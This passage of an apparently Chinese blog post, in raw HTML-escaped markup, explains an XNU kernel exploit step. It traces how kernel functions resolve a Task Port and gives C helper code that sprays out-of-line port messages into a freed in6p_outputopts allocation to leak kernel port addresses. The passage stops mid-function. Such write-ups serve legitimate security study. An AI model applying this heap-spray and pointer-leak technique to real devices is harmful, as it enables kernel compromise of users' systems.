&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_object_copyin()&lt;/code&gt;包含两个函数：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_right_lookup_write()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_right_copyin()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_object_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_type_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;msgt_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objectp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_entry_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;soright&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;release_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assertcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_right_lookup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;release_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_right_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			      &lt;span class=&quot;n&quot;&gt;msgt_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			      &lt;span class=&quot;n&quot;&gt;objectp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;soright&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			      &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;release_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			      &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;assertcnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_right_lookup_write()&lt;/code&gt;调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry_lookup()&lt;/code&gt;，返回值赋值给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;entry&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_right_lookup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_entry_t&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entryp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_entry_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;is_write_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_entry_lookup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IE_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;is_write_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_INVALID_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entryp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里需要提两个概念，一个是结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_space&lt;/code&gt;，它是整个Task的IPC空间，另一个是结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry&lt;/code&gt;，它指向的是结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_object&lt;/code&gt;，结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_space&lt;/code&gt;有一个成员&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is_table&lt;/code&gt;专门用于存储当前Task所有的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry&lt;/code&gt;，在我们这里的场景，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry&lt;/code&gt;指向的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_port&lt;/code&gt;，也就是说，变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;entry&lt;/code&gt;拿到的是最开始传入的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;在内核态的地址&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ipc_entry_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_entry_lookup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_index_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_entry_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_INDEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_table_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;层层往回走，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_object_copyin()&lt;/code&gt;的参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objectp&lt;/code&gt;会被存储到Caller函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor()&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objects[]&lt;/code&gt;数组里，数组&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objects[]&lt;/code&gt;在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/code&gt;进行内存空间分配，所以我们只要让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ports_length&lt;/code&gt;等于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;的大小，就可以让它分配到我们释放掉的空间里&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;先创建一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ports&lt;/code&gt;数组用于存储传入的用户态&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;，然后构造&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OOL Message&lt;/code&gt;，其它都不重要，主要看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg-&amp;gt;ool_ports.address&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg-&amp;gt;ool_ports.count&lt;/code&gt;，这两个构造好就行，调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg_send()&lt;/code&gt;发送消息，此时就会发生内存分配，将用户态&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;转为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;的内核态地址并写入我们可控的内存空间&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fill_kalloc_with_port_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_allocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_RIGHT_RECEIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_COMPLEX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;deallocate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
